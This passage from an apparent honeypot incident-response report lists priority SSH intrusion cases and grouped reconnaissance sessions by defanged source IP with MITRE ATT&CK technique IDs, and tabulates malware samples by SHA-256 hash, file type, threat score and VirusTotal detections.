| IR-43551ad270ae | HIGH | `36.71.71[.]147` | 2026-11-01 06:32 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-b923bfc2bf54 | HIGH | `36.71.71[.]147` | 2026-11-01 06:32 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2f7d931e494b | HIGH | `14.103.115[.]115` | 2026-11-01 06:33 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-b9bd5923a016 | HIGH | `14.103.115[.]115` | 2026-11-01 06:33 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c59273e82d7c | HIGH | `50.6.201[.]228` | 2026-11-01 06:33 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2de2f08c45d6 | HIGH | `50.6.201[.]228` | 2026-11-01 06:33 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1e96c092f3e5 | HIGH | `50.6.205[.]78` | 2026-11-01 06:34 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-3b5716166fe6 | HIGH | `148.135.10[.]99` | 2026-11-01 06:34 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-afe052d5476c | HIGH | `50.6.205[.]78` | 2026-11-01 06:34 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6284dc5a280b | HIGH | `66.116.225[.]38` | 2026-11-01 06:34 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-345dc21df17f | HIGH | `148.135.10[.]99` | 2026-11-01 06:34 | Y | 0 | 0 | `T1078 · T1592` |
| IR-557ec967f90f | HIGH | `66.116.225[.]38` | 2026-11-01 06:34 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c913b1b1298d | HIGH | `154.83.17[.]226` | 2026-11-01 06:35 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-35dbe9321269 | HIGH | `154.83.17[.]226` | 2026-11-01 06:35 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0e748e9d02c8 | HIGH | `110.166.67[.]189` | 2026-11-01 06:35 | Y | 20 | 1 | `T1021.004 · T1053.003 · T1057` |
| IR-4efcda1b03f7 | HIGH | `103.179.95[.]103` | 2026-11-01 06:42 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-d844bcb38123 | HIGH | `103.195.237[.]134` | 2026-11-01 06:42 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-8a75ea1e68c0 | HIGH | `103.179.95[.]103` | 2026-11-01 06:42 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4e49e5936fb8 | HIGH | `103.195.237[.]134` | 2026-11-01 06:42 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f3ce25f0d473 | HIGH | `14.103.71[.]220` | 2026-11-01 06:43 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ae3a0aa88230 | HIGH | `102.88.137[.]213` | 2026-11-01 07:04 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f7cc01af29a5 | HIGH | `102.88.137[.]213` | 2026-11-01 07:04 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f7e0dd273ffc | HIGH | `103.211.217[.]182` | 2026-11-01 07:06 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-7b055c64e9e6 | HIGH | `103.211.217[.]182` | 2026-11-01 07:06 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ba798fd34641 | HIGH | `117.62.22[.]127` | 2026-11-01 07:10 | Y | 0 | 0 | `T1078 · T1592` |
| IR-521790975eff | HIGH | `60.13.227[.]206` | 2026-11-01 07:11 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d169ae71b978 | HIGH | `176.53.159[.]196` | 2026-11-01 07:17 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a26981e7266d | HIGH | `195.178.110[.]232` | 2026-11-01 07:49 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-7afdc66432fc | HIGH | `118.121.202[.]149` | 2026-11-01 07:49 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-30d1dd348932 | HIGH | `195.178.110[.]232` | 2026-11-01 07:50 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-18dcddfb0077 | HIGH | `195.178.110[.]232` | 2026-11-01 07:52 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-92455725f76f | HIGH | `195.178.110[.]232` | 2026-11-01 07:54 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-74caa72fb95e | HIGH | `195.178.110[.]232` | 2026-11-01 07:56 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-cfc6218813cb | HIGH | `195.178.110[.]232` | 2026-11-01 07:58 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-aed0bfdfa35f | HIGH | `195.178.110[.]218` | 2026-11-01 08:01 | Y | 1 | 0 | `T1078 · T1592` |
| IR-3672ecd9235f | HIGH | `195.178.110[.]232` | 2026-11-01 08:01 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-23b21101bae1 | HIGH | `102.210.149[.]105` | 2026-11-01 08:02 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-a6db0ce758c6 | HIGH | `102.210.149[.]105` | 2026-11-01 08:02 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ac692e7901a2 | HIGH | `195.178.110[.]232` | 2026-11-01 08:03 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-e693ca5f207d | HIGH | `195.178.110[.]232` | 2026-11-01 08:05 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-4362a8dcbaa5 | HIGH | `195.178.110[.]232` | 2026-11-01 08:07 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-c3cdcdeedb4a | HIGH | `103.143.231[.]24` | 2026-11-01 08:09 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-cc47866962c0 | HIGH | `103.143.231[.]24` | 2026-11-01 08:09 | Y | 0 | 0 | `T1078 · T1592` |
_… 65 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `137.184.169[.]96` | **4** | 2026-11-01 08:32 | 2026-11-01 14:06 | 4m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **4** | 2026-11-01 02:59 | 2026-11-01 08:04 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **3** | 2026-11-01 10:22 | 2026-11-01 14:05 | 0m | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | **2** | 2026-11-01 03:02 | 2026-11-01 04:08 | 3m | 0 | `T1592` | 🟢 LOW |
| `14.50.139[.]187` | **2** | 2026-11-01 15:58 | 2026-11-01 16:13 | 0m | 0 | `T1592` | 🟢 LOW |
| `178.128.102[.]108` | **2** | 2026-11-01 13:50 | 2026-11-01 14:13 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]218` | **2** | 2026-11-01 05:15 | 2026-11-01 06:45 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `195.178.110[.]232` | **2** | 2026-11-01 07:41 | 2026-11-01 08:00 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `100.36.74[.]218` | 1 | 2026-11-01 13:08 | 2026-11-01 13:08 | 13s | 0 | `T1592` | 🟢 LOW |
| `101.126.64[.]76` | 1 | 2026-11-01 05:51 | 2026-11-01 05:53 | 120s | 0 | `T1592` | 🟢 LOW |
| `103.131.61[.]163` | 1 | 2026-11-01 11:10 | 2026-11-01 11:11 | 32s | 0 | `T1592` | 🟢 LOW |
| `103.29.70[.]204` | 1 | 2026-11-01 06:11 | 2026-11-01 06:12 | 10s | 0 | `T1592` | 🟢 LOW |
| `110.166.67[.]189` | 1 | 2026-11-01 06:35 | 2026-11-01 06:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.192[.]114` | 1 | 2026-11-01 08:55 | 2026-11-01 08:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `116.255.227[.]108` | 1 | 2026-11-01 15:23 | 2026-11-01 15:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.62.22[.]127` | 1 | 2026-11-01 07:10 | 2026-11-01 07:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.196.86[.]3` | 1 | 2026-11-01 06:38 | 2026-11-01 06:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `119.96.158[.]238` | 1 | 2026-11-01 06:29 | 2026-11-01 06:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.27.157[.]18` | 1 | 2026-11-01 12:12 | 2026-11-01 12:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `121.152.123[.]106` | 1 | 2026-11-01 03:08 | 2026-11-01 03:09 | 30s | 0 | `T1592` | 🟢 LOW |
| `121.224.5[.]228` | 1 | 2026-11-01 03:51 | 2026-11-01 03:51 | 5s | 0 | `T1592` | 🟢 LOW |
| `121.30.239[.]86` | 1 | 2026-11-01 08:57 | 2026-11-01 08:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `121.40.84[.]227` | 1 | 2026-11-01 16:50 | 2026-11-01 16:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `122.202.41[.]161` | 1 | 2026-11-01 13:25 | 2026-11-01 13:26 | 30s | 0 | `T1592` | 🟢 LOW |
| `125.39.148[.]106` | 1 | 2026-11-01 04:17 | 2026-11-01 04:17 | 0s | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | 1 | 2026-11-01 06:09 | 2026-11-01 06:10 | 90s | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | 1 | 2026-11-01 16:26 | 2026-11-01 16:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `14.103.107[.]229` | 1 | 2026-11-01 06:33 | 2026-11-01 06:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `140.246.218[.]62` | 1 | 2026-11-01 06:36 | 2026-11-01 06:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `143.198.208[.]150` | 1 | 2026-11-01 03:15 | 2026-11-01 03:17 | 88s | 0 | `T1592` | 🟢 LOW |
| `143.198.208[.]150` | 1 | 2026-11-01 13:11 | 2026-11-01 13:12 | 63s | 0 | `T1592` | 🟢 LOW |
| `168.0.82[.]255` | 1 | 2026-11-01 11:21 | 2026-11-01 11:21 | 13s | 0 | `T1592` | 🟢 LOW |
| `172.235.41[.]44` | 1 | 2026-11-01 05:54 | 2026-11-01 05:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `173.255.225[.]15` | 1 | 2026-11-01 08:33 | 2026-11-01 08:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `176.135.107[.]138` | 1 | 2026-11-01 07:32 | 2026-11-01 07:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `178.128.102[.]108` | 1 | 2026-11-01 16:38 | 2026-11-01 16:39 | 52s | 0 | `T1592` | 🟢 LOW |
| `183.63.216[.]198` | 1 | 2026-11-01 08:10 | 2026-11-01 08:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `184.105.247[.]254` | 1 | 2026-11-01 04:02 | 2026-11-01 04:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.180.141[.]42` | 1 | 2026-11-01 09:10 | 2026-11-01 09:10 | 4s | 0 | `T1592` | 🟢 LOW |
| `185.180.141[.]43` | 1 | 2026-11-01 09:10 | 2026-11-01 09:10 | 4s | 0 | `T1592` | 🟢 LOW |
| `185.180.141[.]44` | 1 | 2026-11-01 09:10 | 2026-11-01 09:10 | 8s | 0 | `T1592` | 🟢 LOW |
| `185.180.141[.]45` | 1 | 2026-11-01 09:10 | 2026-11-01 09:10 | 5s | 0 | `T1592` | 🟢 LOW |
| `185.190.181[.]173` | 1 | 2026-11-01 13:58 | 2026-11-01 13:58 | 13s | 0 | `T1592` | 🟢 LOW |
| `185.49.24[.]18` | 1 | 2026-11-01 09:33 | 2026-11-01 09:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `188.227.111[.]138` | 1 | 2026-11-01 04:08 | 2026-11-01 04:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `192.248.150[.]180` | 1 | 2026-11-01 12:00 | 2026-11-01 12:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | 1 | 2026-11-01 06:02 | 2026-11-01 06:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | 1 | 2026-11-01 11:12 | 2026-11-01 11:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]84` | 1 | 2026-11-01 04:33 | 2026-11-01 04:33 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `193.47.62[.]69` | 1 | 2026-11-01 16:03 | 2026-11-01 16:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]217` | 1 | 2026-11-01 15:27 | 2026-11-01 15:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]227` | 1 | 2026-11-01 04:02 | 2026-11-01 04:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.214.211[.]38` | 1 | 2026-11-01 12:18 | 2026-11-01 12:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `195.96.139[.]117` | 1 | 2026-11-01 14:51 | 2026-11-01 14:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `196.171.112[.]98` | 1 | 2026-11-01 03:57 | 2026-11-01 03:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `199.165.159[.]113` | 1 | 2026-11-01 11:34 | 2026-11-01 11:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.112.236[.]72` | 1 | 2026-11-01 07:58 | 2026-11-01 07:58 | 9s | 0 | `T1592` | 🟢 LOW |
| `211.198.160[.]213` | 1 | 2026-11-01 08:40 | 2026-11-01 08:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `211.22.148[.]98` | 1 | 2026-11-01 10:25 | 2026-11-01 10:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `211.253.2[.]115` | 1 | 2026-11-01 03:39 | 2026-11-01 03:39 | 15s | 0 | `T1592` | 🟢 LOW |
| `216.244.244[.]28` | 1 | 2026-11-01 13:37 | 2026-11-01 13:37 | 10s | 0 | `T1592` | 🟢 LOW |
| `217.199.148[.]228` | 1 | 2026-11-01 15:51 | 2026-11-01 15:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `218.4.214[.]115` | 1 | 2026-11-01 11:51 | 2026-11-01 11:53 | 120s | 0 | `T1592` | 🟢 LOW |
| `220.82.215[.]158` | 1 | 2026-11-01 08:47 | 2026-11-01 08:47 | 27s | 0 | `T1592` | 🟢 LOW |
| `220.87.110[.]141` | 1 | 2026-11-01 06:58 | 2026-11-01 06:58 | 28s | 0 | `T1592` | 🟢 LOW |
| `221.144.221[.]177` | 1 | 2026-11-01 03:31 | 2026-11-01 03:31 | 30s | 0 | `T1592` | 🟢 LOW |
| `221.159.163[.]36` | 1 | 2026-11-01 03:54 | 2026-11-01 03:54 | 23s | 0 | `T1592` | 🟢 LOW |
| `221.166.164[.]167` | 1 | 2026-11-01 15:38 | 2026-11-01 15:38 | 21s | 0 | `T1592` | 🟢 LOW |
| `222.96.89[.]197` | 1 | 2026-11-01 10:55 | 2026-11-01 10:55 | 20s | 0 | `T1592` | 🟢 LOW |
| `223.16.154[.]241` | 1 | 2026-11-01 15:51 | 2026-11-01 15:51 | 18s | 0 | `T1592` | 🟢 LOW |
| `3.129.187[.]38` | 1 | 2026-11-01 09:52 | 2026-11-01 09:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `31.202.162[.]248` | 1 | 2026-11-01 07:31 | 2026-11-01 07:31 | 13s | 0 | `T1592` | 🟢 LOW |
| `35.206.183[.]188` | 1 | 2026-11-01 04:47 | 2026-11-01 04:47 | 13s | 0 | `T1592` | 🟢 LOW |
| `35.210.136[.]244` | 1 | 2026-11-01 04:00 | 2026-11-01 04:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.191[.]203` | 1 | 2026-11-01 06:12 | 2026-11-01 06:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.54[.]75` | 1 | 2026-11-01 05:47 | 2026-11-01 05:47 | 12s | 0 | `T1592` | 🟢 LOW |
| `35.210.82[.]106` | 1 | 2026-11-01 06:11 | 2026-11-01 06:11 | 6s | 0 | `T1592` | 🟢 LOW |
| `36.133.118[.]11` | 1 | 2026-11-01 04:22 | 2026-11-01 04:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `36.213.72[.]232` | 1 | 2026-11-01 04:10 | 2026-11-01 04:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `37.55.229[.]70` | 1 | 2026-11-01 09:06 | 2026-11-01 09:06 | 32s | 0 | `T1592` | 🟢 LOW |
| `39.104.64[.]139` | 1 | 2026-11-01 03:28 | 2026-11-01 03:28 | 8s | 0 | `T1592` | 🟢 LOW |
| `39.130.240[.]253` | 1 | 2026-11-01 06:29 | 2026-11-01 06:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `4.236.164[.]36` | 1 | 2026-11-01 10:21 | 2026-11-01 10:22 | 10s | 0 | `T1592` | 🟢 LOW |
| `40.119.27[.]186` | 1 | 2026-11-01 05:36 | 2026-11-01 05:36 | 9s | 0 | `T1592` | 🟢 LOW |
| `40.74.212[.]22` | 1 | 2026-11-01 12:18 | 2026-11-01 12:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.120.58[.]196` | 1 | 2026-11-01 14:02 | 2026-11-01 14:03 | 33s | 0 | `T1592` | 🟢 LOW |
| `45.141.233[.]16` | 1 | 2026-11-01 14:52 | 2026-11-01 14:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]152` | 1 | 2026-11-01 07:03 | 2026-11-01 07:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.169.98[.]90` | 1 | 2026-11-01 15:36 | 2026-11-01 15:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.176.14[.]0` | 1 | 2026-11-01 03:51 | 2026-11-01 03:52 | 32s | 0 | `T1592` | 🟢 LOW |
| `45.226.33[.]18` | 1 | 2026-11-01 09:46 | 2026-11-01 09:46 | 13s | 0 | `T1592` | 🟢 LOW |
| `45.234.121[.]192` | 1 | 2026-11-01 05:19 | 2026-11-01 05:20 | 33s | 0 | `T1592` | 🟢 LOW |
| `45.79.172[.]21` | 1 | 2026-11-01 03:50 | 2026-11-01 03:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `52.248.41[.]39` | 1 | 2026-11-01 03:18 | 2026-11-01 03:18 | 9s | 0 | `T1592` | 🟢 LOW |
| `59.12.212[.]254` | 1 | 2026-11-01 03:10 | 2026-11-01 03:11 | 27s | 0 | `T1592` | 🟢 LOW |
| `59.12.212[.]254` | 1 | 2026-11-01 11:18 | 2026-11-01 11:19 | 25s | 0 | `T1592` | 🟢 LOW |
| `60.13.227[.]206` | 1 | 2026-11-01 07:16 | 2026-11-01 07:16 | 1s | 0 | `T1592` | 🟢 LOW |
| `60.16.138[.]210` | 1 | 2026-11-01 03:19 | 2026-11-01 03:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]13` | 1 | 2026-11-01 05:13 | 2026-11-01 05:13 | 4s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-11-01 03:19 | 2026-11-01 03:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.159[.]105` | 1 | 2026-11-01 04:32 | 2026-11-01 04:32 | 1s | 0 | `T1592` | 🟢 LOW |
| `66.132.159[.]114` | 1 | 2026-11-01 07:31 | 2026-11-01 07:31 | 2s | 0 | `T1592` | 🟢 LOW |
| `66.132.159[.]120` | 1 | 2026-11-01 08:33 | 2026-11-01 08:33 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.159[.]128` | 1 | 2026-11-01 05:53 | 2026-11-01 05:53 | 14s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]162` | 1 | 2026-11-01 04:33 | 2026-11-01 04:33 | 1s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]162` | 1 | 2026-11-01 08:33 | 2026-11-01 08:33 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]193` | 1 | 2026-11-01 03:05 | 2026-11-01 03:06 | 16s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]100` | 1 | 2026-11-01 08:32 | 2026-11-01 08:32 | 16s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]168` | 1 | 2026-11-01 14:36 | 2026-11-01 14:36 | 2s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]50` | 1 | 2026-11-01 16:43 | 2026-11-01 16:44 | 14s | 0 | `T1592` | 🟢 LOW |
| `66.228.62[.]150` | 1 | 2026-11-01 12:35 | 2026-11-01 12:35 | 1s | 0 | `T1592` | 🟢 LOW |
| `71.6.134[.]234` | 1 | 2026-11-01 13:38 | 2026-11-01 13:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `73.190.158[.]98` | 1 | 2026-11-01 09:46 | 2026-11-01 09:46 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-11-01 14:14 | 2026-11-01 14:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]234` | 1 | 2026-11-01 09:02 | 2026-11-01 09:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.11.167[.]83` | 1 | 2026-11-01 10:11 | 2026-11-01 10:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]51` | 1 | 2026-11-01 12:03 | 2026-11-01 12:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.201.235[.]192` | 1 | 2026-11-01 10:30 | 2026-11-01 10:30 | 13s | 0 | `T1592` | 🟢 LOW |
| `91.215.57[.]44` | 1 | 2026-11-01 04:58 | 2026-11-01 04:58 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0c99433c7d433d65ab890dcee20b330f262379d532bc76f91e18f09ecfa5fb54` | Shell Script | `0c99433c7d433d65...` | 30/100 | 🟢 LOW | 0/75 ✅ |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
